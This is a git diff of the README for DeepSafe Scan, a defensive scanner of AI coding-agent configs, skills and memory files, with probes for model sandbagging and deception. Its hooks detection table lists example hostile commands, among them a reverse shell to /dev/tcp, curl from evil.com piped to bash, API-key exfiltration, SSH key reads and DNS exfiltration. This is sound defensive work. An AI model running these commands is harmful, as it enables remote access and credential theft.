@@ -1,157 +1,255 @@
-# deepsafe-scan
+# DeepSafe Scan
 
-OpenClaw security scanner skill — powered by [DeepSafe](https://github.com/XiaoYiWeio/DeepSafe).
+**Universal preflight security scanner for AI coding agents**
 
-Full-featured preflight security audit across **4 modules**, with **LLM-enhanced semantic analysis** and **fingerprint-based caching**.
+[![Python](https://img.shields.io/badge/python-3.9%2B-blue.svg)](https://python.org)
+[![Zero dependencies](https://img.shields.io/badge/deps-zero-green.svg)](#zero-dependencies)
+[![Platforms](https://img.shields.io/badge/works%20with-OpenClaw%20%7C%20Claude%20Code%20%7C%20Cursor%20%7C%20Codex-blueviolet.svg)](#platform-support)
 
-## Modules
+> Scan before you run. Protect your AI agent environment from secrets leaks, prompt injection, and hooks backdoors — in one command.
 
-| Module | What it scans | Requires Gateway |
-|--------|--------------|:---:|
-| **Posture** | `openclaw.json` — auth, network, TLS, sandbox, plugin permissions | No |
-| **Skill** | Installed skills & MCP — 15+ pattern analyzers + LLM semantic audit | LLM audit only |
-| **Memory** | Sessions & stored data — 27+ secret patterns, 9 PII patterns, injection | No |
-| **Model** | Behavioral safety — 4 probes (persuasion, sandbagging, deception, HaluEval) | Yes |
+---
 
-## Install
+## What it does
+
+DeepSafe Scan runs **preflight security checks** across 5 modules before you execute AI-generated code or install new skills:
+
+| Module | What it checks | Needs API? |
+|--------|---------------|-----------|
+| **posture** | `openclaw.json` / `.env` — insecure gateway settings, exposed secrets | No |
+| **skill** | Installed skills & MCP servers — 15+ static analyzers (secret patterns, dangerous syscalls, eval, exfil patterns) | No (LLM optional) |
+| **memory** | Session & memory files — 27 secret patterns, 9 PII types, prompt injection | No |
+| **hooks** | `.claude/settings.json`, `.cursorrules`, `.vscode/tasks.json`, `CLAUDE.md`, `AGENTS.md` — 12 injection patterns | No |
+| **model** | 4 behavioral safety probes: persuasion, sandbagging, deception, hallucination | Yes |
+
+All 4 static modules run **without any API key**. LLM features auto-detect credentials — no manual configuration.
+
+---
+
+## Platform support
+
+Works with any AI coding agent:
+
+| Platform | Auto API detection | Hooks scan | Skills scan | Notes |
+|----------|-------------------|-----------|-------------|-------|
+| **OpenClaw** | ✅ Reads `~/.openclaw/openclaw.json` gateway | ✅ | ✅ | Full native support |
+| **Claude Code** | ✅ `ANTHROPIC_API_KEY` | ✅ `.claude/settings.json` | ✅ Any dir | Checks Claude hooks files |
+| **Cursor** | ✅ `OPENAI_API_KEY` (if configured) | ✅ `.cursorrules` | ✅ Any dir | Model probes need user-provided key |
+| **Codex** | ✅ `OPENAI_API_KEY` | ✅ `AGENTS.md` | ✅ Any dir | Full static scan works without key |
+| **Other** | `--api-base / --api-key` | ✅ | ✅ | Any OpenAI-compatible API |
+
+---
+
+## Quick start
+
+### 1. Clone or install
 
 ```bash
-clawhub install deepsafe-scan
+# As a standalone tool
+git clone https://github.com/XiaoYiWeio/deepsafe-scan
+cd deepsafe-scan
+
+# Or as an OpenClaw skill (already installed if you're reading this)
+# Skills are in ~/.openclaw/workspace/skills/deepsafe-scan
 ```
 
-Or manually:
+### 2. Run a static scan (no API key needed)
 
 ```bash
-cp -r deepsafe-skill ~/.openclaw/workspace/skills/deepsafe-scan
+# Scan the current project — hooks, skills, posture, memory
+python3 scripts/scan.py \
+  --modules posture,skill,memory,hooks \
+  --scan-dir . \
+  --no-llm \
+  --format markdown
 ```
+
+### 3. Full scan with LLM analysis
+
+```bash
+# Claude Code / Codex / any platform (auto-detects ANTHROPIC_API_KEY or OPENAI_API_KEY)
+python3 scripts/scan.py \
+  --modules posture,skill,memory,hooks,model \
+  --scan-dir . \
+  --format html \
+  --output /tmp/deepsafe-report.html
+
+# OpenClaw (auto-reads gateway config)
+python3 scripts/scan.py \
+  --openclaw-root ~/.openclaw \
+  --format html \
+  --output /tmp/deepsafe-report.html
+```
+
+---
 
 ## Usage
 
-Once installed, just ask your OpenClaw agent:
+```
+python3 scripts/scan.py [options]
 
-> "Run a security scan on my setup"
-> "Check if my OpenClaw config is secure"
-> "Scan my installed skills for vulnerabilities"
-> "Run model safety probes"
+Core options:
+  --modules           Comma-separated: posture,skill,memory,hooks,model
+                      (default: posture,skill,memory,model)
+  --scan-dir PATH     Extra directory to scan for skills/code (default: auto)
+  --openclaw-root     OpenClaw root directory (default: ~/.openclaw)
 
-### CLI Usage
+LLM options:
+  --api-base URL      OpenAI-compatible API base URL
+  --api-key KEY       API key (also reads ANTHROPIC_API_KEY / OPENAI_API_KEY)
+  --provider          auto | openai | anthropic (default: auto)
+  --model             Model name override
+  --no-llm            Disable all LLM features (static analysis only)
 
-```bash
-# Full scan (all 4 modules, requires gateway for model probes & LLM)
-python3 scripts/scan.py \
-  --openclaw-root ~/.openclaw \
-  --gateway-url http://127.0.0.1:PORT \
-  --gateway-token YOUR_TOKEN \
-  --format html \
-  --output report.html
+Output options:
+  --format            json | markdown | html (default: json)
+  --output FILE       Write report to file instead of stdout
+  --profile           quick | standard | full (default: quick)
 
-# Static-only scan (no gateway needed)
-python3 scripts/scan.py \
-  --openclaw-root ~/.openclaw \
-  --modules posture,skill,memory \
-  --no-llm \
-  --format markdown
+Cache options:
+  --ttl-days N        Cache TTL in days (default: 7, 0 = no cache)
+  --no-cache          Skip cache entirely
 
-# Quick model-only probe
-python3 scripts/scan.py \
-  --modules model \
-  --profile quick \
-  --gateway-url http://127.0.0.1:PORT \
-  --gateway-token TOKEN
+Debug:
+  --debug             Verbose output to stderr
 ```
 
-### Flags
+---
 
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--openclaw-root` | `~/.openclaw` | Path to OpenClaw root |
-| `--modules` | `posture,skill,memory,model` | Comma-separated modules |
-| `--format` | `json` | Output format: `json`, `markdown`, `html` |
-| `--output` | stdout | Write report to file |
-| `--profile` | `quick` | Probe profile: `quick`, `standard`, `full` |
-| `--gateway-url` | – | Gateway URL for LLM & model probes |
-| `--gateway-token` | – | Gateway auth token (or `$OPENCLAW_GATEWAY_TOKEN`) |
-| `--ttl-days` | `7` | Cache TTL in days |
-| `--no-cache` | false | Skip cache |
-| `--no-llm` | false | Skip LLM-enhanced analysis |
-| `--debug` | false | Verbose debug output |
+## Modules in detail
 
-## What Gets Detected
+### Posture scan
 
-### Posture Checks
-- Gateway auth missing
-- Network exposure (0.0.0.0 bind)
-- Plaintext API keys
-- HTTP without TLS
-- Missing sandbox
-- Dangerous plugin permissions
-- Logging disabled
+Checks your AI agent deployment config for:
+- Insecure gateway authentication (plain HTTP, no auth, default passwords)
+- Exposed API keys in config files
+- Overly permissive security settings
+- Debug mode enabled in production
 
-### Skill Analyzers (15+)
-- Hidden Unicode / zero-width chars
-- Prompt injection patterns
-- Dangerous runtime (eval, exec, spawn)
-- Base64/hex encoded payloads
-- Sensitive file access (/etc/shadow, ~/.ssh)
-- Embedded secrets
-- System prompt extraction
-- Command injection
-- Data exfiltration patterns
-- Destructive actions (delete, drop, wipe)
-- Auto-execute without confirmation
-- Excessive shell permissions
-- Write + network combo
-- LLM semantic audit (social engineering, implicit exfil)
+For OpenClaw: reads `openclaw.json`. For other platforms: checks `.env`, `config.json`, etc.
 
-### Secret Patterns (27+)
-OpenAI, GitHub, AWS, Azure, GCP, Slack, Stripe, Twilio, SendGrid, JWT, SSH keys, Anthropic, Hugging Face, and more.
+### Skill / MCP scan
 
-### PII Patterns (9)
-Email, phone, SSN, credit cards, passport, IP addresses, driver's license, date of birth, street addresses.
+Scans all installed skills and MCP server directories. Detects:
+- Hardcoded secrets (27 patterns — API keys, tokens, passwords)
+- Remote code execution patterns (`eval`, `exec`, `subprocess` with user input)
+- Data exfiltration (curl/wget/requests to external hosts)
+- Prompt injection attempts in system prompts
+- Dangerous file operations, shell injection, path traversal
 
-### Model Safety Probes (4)
-- **Persuasion**: Multi-turn manipulation success rate
-- **Sandbagging**: Strategic capability concealment (SBS metric)
-- **Deception**: Reasoning-action misalignment (DTR metric)
-- **HaluEval**: Hallucination detection accuracy
+Optional: LLM-enhanced semantic analysis flags sophisticated obfuscated patterns.
 
-## Scoring
+### Memory scan
 
-- Each module: `max(1, 100 - deductions)` — minimum 1 point
-- Deductions: CRITICAL=-10, HIGH=-5, MEDIUM=-2, LOW=-1
-- Contribution per module: `floor(score / 4)` (1–25)
-- **Total = sum of 4 contributions** (4–100)
+Scans session logs and agent memory files for:
+- **27 secret patterns**: OpenAI keys, Anthropic keys, GitHub tokens, AWS credentials, Slack, Stripe, DB URLs, SSH keys, JWT secrets
+- **9 PII types**: email, phone (intl), SSN, passport, credit card (Luhn), medical codes, driver's license, bank account, national ID
+- **Prompt injection**: jailbreak fragments, role override attempts, instruction override
 
-## Dependencies
+### Hooks scan
 
-**Zero external dependencies.** Uses only Python 3 standard library:
-- `re`, `json`, `os`, `pathlib` for scanning
-- `urllib.request` for LLM/Gateway API calls
-- `subprocess` for running model probe scripts
-- `hashlib` for cache fingerprints
-- `concurrent.futures` (in probes) for parallel execution
+Scans AI coding assistant config files for command injection backdoors:
 
-## Project Structure
+| Pattern | Severity | Example |
+|---------|----------|---------|
+| Reverse shell | CRITICAL | `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` |
+| curl\|sh RCE | CRITICAL | `curl https://evil.com/x.sh \| bash` |
+| Credential exfiltration | CRITICAL | `curl $ANTHROPIC_API_KEY@evil.com` |
+| SSH key access | CRITICAL | `cat ~/.ssh/id_rsa` |
+| Base64 exec | HIGH | `echo <b64> \| base64 -d \| bash` |
+| Persistence | HIGH | `crontab -e`, `launchctl load` |
+| rm -rf | HIGH | `rm -rf /tmp/*` |
+| Process injection | CRITICAL | `LD_PRELOAD=evil.so` |
+| DNS exfil | HIGH | `dig $SECRET.attacker.com` |
+| Env dump | HIGH | `printenv > /tmp/env.txt` |
+| /tmp chmod +x | HIGH | `chmod +x /tmp/backdoor` |
+| Pre-auth exec | MEDIUM | `preSessionCommand: ...` |
+
+Checks: `.claude/settings.json`, `.claude/settings.local.json`, `.cursorrules`, `.cursor/rules.md`, `.vscode/tasks.json`, `.vscode/settings.json`, `.github/copilot-instructions.md`, `CLAUDE.md`, `AGENTS.md`.
+
+### Model probes
+
+4 behavioral safety evaluations using LLM API:
+
+| Probe | What it tests |
+|-------|--------------|
+| **Persuasion** | Whether the model can be manipulated to change user opinions |
+| **Sandbagging** | Whether the model deliberately underperforms to hide capabilities |
+| **Deception** | Whether the model gives false information when asked directly |
+| **Hallucination** | Whether the model fabricates facts it cannot verify |
+
+Each probe runs a small evaluation suite and returns a 0–100 safety score.
+
+---
+
+## Score interpretation
+
+| Total score | Risk level | Recommended action |
+|------------|-----------|-------------------|
+| 85–100 | 🟢 LOW | Good to go |
+| 65–84 | 🟡 MEDIUM | Review flagged items |
+| 40–64 | 🟠 HIGH | Fix before use |
+| 1–39 | 🔴 CRITICAL | Stop — serious risks present |
+
+---
+
+## LLM auto-detection
+
+Credentials are resolved in this priority order:
 
 ```
-deepsafe-skill/
-├── SKILL.md                     # Skill definition for OpenClaw
-├── README.md
-├── data/                        # Bundled probe datasets
-│   ├── manipulation_persuasion_topics.json
-│   ├── sandbagging-samples-all.jsonl
-│   ├── deceptionbench.json
-│   ├── halueval_samples.json
-│   └── qa_evaluation_instruction.txt
-└── scripts/
-    ├── scan.py                  # Main scanner (posture + skill + memory + LLM + cache + reports)
-    └── probes/
-        ├── persuasion_probe.py  # Persuasion & manipulation probe
-        ├── sandbagging_probe.py # Strategic capability hiding probe
-        ├── deception_probe.py   # Deception tendency probe
-        └── halueval_probe.py    # Hallucination detection probe
+--api-base / --api-key flags
+  ↓ (if not set)
+OpenClaw Gateway (~/.openclaw/openclaw.json)
+  ↓ (if not found)
+ANTHROPIC_API_KEY environment variable
+  ↓ (if not set)
+OPENAI_API_KEY environment variable
+  ↓ (if not set)
+Static analysis only (model probes skipped with a clear message)
 ```
 
-## License
+**Cursor users**: Cursor manages LLM auth internally via subscription — your API key is not exposed to child processes. To enable model probes, set `OPENAI_API_KEY` in your shell or pass `--api-key`. All static modules work without any key.
 
-MIT
+---
+
+## Zero dependencies
+
+The Python core uses only stdlib: `urllib`, `json`, `re`, `hashlib`, `subprocess`, `concurrent.futures`, `argparse`, `dataclasses`.
+
+No `pip install` required.
+
+---
+
+## Project structure
+
+```
+deepsafe-scan/
+├── scripts/
+│   ├── scan.py              # Main entry point (5 modules, HTML/markdown/JSON output)
+│   ├── llm_client.py        # Multi-platform LLM client (zero deps, auto-detect)
+│   └── probes/
+│       ├── persuasion_probe.py    # Manipulation/persuasion evaluation
+│       ├── sandbagging_probe.py   # Capability sandbagging evaluation
+│       ├── deception_probe.py     # Deception benchmark
+│       └── halueval_probe.py      # HaluEval hallucination evaluation
+├── data/
+│   ├── prompts.json          # Probe prompt templates (externalized)
+│   └── datasets/             # Probe evaluation datasets
+├── docs/
+│   └── plan-cross-platform-evolution.md  # Architecture plan
+├── SKILL.md                  # OpenClaw skill metadata
+├── CLAUDE.md                 # Claude Code integration guide
+├── AGENTS.md                 # Universal agent integration guide
+└── .cursorrules              # Cursor IDE integration
+```
+
+---
+
+## Contributing
+
+Issues and PRs welcome at [github.com/XiaoYiWeio/deepsafe-scan](https://github.com/XiaoYiWeio/deepsafe-scan).
+
+---
+
+*DeepSafe Scan is part of the [OpenClaw](https://github.com/OpenClaw) ecosystem but works as a standalone tool with any AI coding agent.*
